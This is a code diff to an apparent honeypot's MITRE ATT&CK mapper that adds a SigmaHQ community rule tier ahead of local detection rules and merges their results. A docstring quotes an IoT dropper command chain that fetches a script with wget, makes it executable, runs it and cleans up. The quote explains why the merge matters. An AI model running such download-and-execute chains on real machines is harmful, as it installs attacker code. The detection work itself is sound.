@@ -46,6 +46,7 @@ CLI
     python threat_intel/mitre_mapper.py "<command>"      tag one command
 """
 
+import functools
 import json
 import os
 import re
@@ -53,7 +54,12 @@ import re
 _HERE = os.path.dirname(os.path.abspath(__file__))
 STIX_PATH    = os.path.join(_HERE, "enterprise-attack.json")
 CATALOG_PATH = os.path.join(_HERE, "mitre_catalog.json")
-RULES_DIR    = os.path.join(_HERE, "rules")
+# Local Threat Intel Tier. The Global Community Tier (SigmaHQ) lives in
+# rules/upstream/ and is loaded by threat_intel/sigma_import.py, which has a
+# generic Sigma field engine; this module's engine matches command TEXT only,
+# so it must not try to parse upstream rules.
+RULES_DIR    = os.path.join(_HERE, "rules", "local_custom")
+UPSTREAM_DIR = os.path.join(_HERE, "rules", "upstream")
 
 # Split points for the `segment` field. Deliberately NOT the pipe: a pipeline
 # is one semantic unit, and the pipe-to-shell rules need it intact.
@@ -399,13 +405,66 @@ def _describe(rule: Rule) -> dict:
     }
 
 
+# ── priority pipeline: SigmaHQ upstream first, local custom as fallback ──────
+_UPSTREAM_ENABLED = True
+
+
+@functools.lru_cache(maxsize=8192)
+def _upstream_cached(cmd: str) -> tuple:
+    try:
+        from threat_intel import sigma_import
+        return tuple(tuple(sorted(h.items(), key=lambda kv: kv[0]))
+                     for h in sigma_import.classify_command(cmd))
+    except Exception:
+        return ()
+
+
+def _upstream(cmd: str) -> list:
+    """SigmaHQ (rules/upstream/) hits for `cmd`, or [] .
+
+    Imported lazily: sigma_import imports _compile_condition from this module,
+    so a module-level import would be circular. Any failure degrades to the
+    local tier rather than taking tagging down.
+    """
+    if not _UPSTREAM_ENABLED:
+        return []
+    # Attacker commands repeat heavily (132k rows, 4.3k unique), so memoising
+    # the 180-rule upstream sweep is the difference between 1 ms and ~0 per
+    # repeat hit. Cached as tuples because lru_cache needs hashable returns.
+    return [dict(h) for h in _upstream_cached(cmd)]
+
+
+def _describe_upstream(hit: dict) -> dict:
+    """Upstream rules carry a technique ID but no name/tactic, so resolve those
+    from the MITRE catalog. Falls back to the Sigma tactic tag when the catalog
+    has not been rebuilt for that technique yet."""
+    tid = hit["technique_id"]
+    meta = _load_catalog().get(tid, {})
+    tactic = meta.get("tactic")
+    if not tactic and hit.get("tactics"):
+        tactic = hit["tactics"][0].replace("-", " ").title()
+    return {"technique_id": tid,
+            "technique": meta.get("name") or tid,
+            "tactic": tactic or ""}
+
+
 def tag(cmd: str):
     """Primary tag: {technique_id, technique, tactic} or None.
 
-    Signature and return shape are unchanged from the pre-YAML version so the
-    existing callers (main.py's session/SIEM events, dashboard.py's per-command
-    lookup) keep working. Use tag_all() for the full multi-technique list.
+    Priority pipeline:
+      1. rules/upstream/     SigmaHQ community rules  (preferred - auditable,
+                             vendor-agnostic, not authored here)
+      2. rules/local_custom/ HydraPoT rules, only when upstream finds nothing.
+                             These carry the heavy honeypot traffic (ls, top,
+                             nproc, chmod ...) that SigmaHQ has no rule for.
+
+    Return shape is unchanged - exactly {technique_id, technique, tactic} - so
+    main.py's session/SIEM events and dashboard.py's per-command lookup keep
+    working, and storage.py's fixed column list is unaffected.
     """
+    up = _upstream(cmd)
+    if up:
+        return _describe_upstream(up[0])
     hits = match_rules(cmd)
     return _describe(hits[0]) if hits else None
 
@@ -415,14 +474,35 @@ def tag_all(cmd: str) -> list:
 
     Each entry carries the rule that produced it, so a surprising tag on the
     dashboard can be traced straight back to a file.
+
+    UNION, not fallback. Upstream (SigmaHQ) entries come first so the dashboard
+    leads with community-authored attribution, then every local technique not
+    already present is appended. tag() keeps strict upstream-first priority for
+    its single primary tag, so main.py's contract is unchanged.
+
+    Why this is a union: validate_traffic.py caught the fallback version losing
+    most of an attack chain. On the IoT dropper line
+        cd /tmp || ...; wget http://…/njs.sh; chmod +x njs.sh; sh njs.sh; tftp …
+    upstream matches only T1070.003, while the local tier finds T1070.003,
+    T1105, T1059.004, T1222.002 and T1070.004. Returning on the first upstream
+    hit reported 1 technique out of 5 and hid the download, the permission
+    change, the execution and the cleanup.
     """
     out, seen = [], set()
+    for h in _upstream(cmd):
+        if h["technique_id"] in seen:
+            continue
+        seen.add(h["technique_id"])
+        out.append({**_describe_upstream(h), "confidence": h.get("level") or "",
+                    "priority": 0, "rule_id": h["rule_id"],
+                    "rule_title": h["rule_title"], "source": "sigmahq"})
     for r in match_rules(cmd):
         if r.technique in seen:
             continue
         seen.add(r.technique)
         out.append({**_describe(r), "confidence": r.confidence,
-                    "priority": r.priority, "rule_id": r.id, "rule_title": r.title})
+                    "priority": r.priority, "rule_id": r.id,
+                    "rule_title": r.title, "source": "local_custom"})
     return out
 
 
@@ -442,6 +522,11 @@ def build_catalog(stix_path: str = STIX_PATH, out_path: str = CATALOG_PATH) -> d
     to break tactic matching in a downstream SIEM.
     """
     wanted = {r.technique for r in load_rules()}
+    try:                                  # include the upstream tier's techniques
+        from threat_intel import sigma_import
+        wanted |= {t for r in sigma_import.load()[0] for t in r.techniques}
+    except Exception as e:
+        print(f"[mitre] upstream techniques unavailable for catalog: {e}")
     if not wanted:
         raise RuleError(f"no rules loaded from {RULES_DIR}; nothing to build")
 
